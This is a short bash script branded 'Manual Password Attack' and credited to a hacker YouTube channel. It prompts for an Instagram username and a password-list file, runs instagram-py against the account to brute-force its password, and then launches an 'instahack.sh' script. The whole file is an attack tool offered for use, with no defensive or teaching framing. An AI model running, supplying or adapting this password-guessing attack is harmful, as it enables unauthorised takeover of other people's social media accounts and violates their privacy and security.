#wordlist selection
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
 echo '                   _                 _   
 o                       | |               | |  
 _  _    , _|_  __,  | |     __,   __  | |  
 |  / |/ |  / \_|  /  |  |/ \   /  |  /    |/_) 
 |_/  |  |_/ \/ |_/\_/|_/|   |_/\_/|_/\___/| \_/
 [#] Manual Password Attack [#]
 ' |lolcat
printf "\n"
printf "                \e[101m\e[1;77m  >>  Script By EvilDevil W A S I << \e[0m\n"
printf "\n"
printf "  \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m youtube.com/Hackerwasi \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] User Name : " usrnm
echo
read -p "[#] Enter Passlist Location : " inspass
echo
if [ $inspass = 0 ]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else
instagram-py --username $usrnm --password-list $inspass
echo
sleep 1.0
cd $HOME
fi
sleep 1.0
cd $HOME/instahack
bash instahack.sh
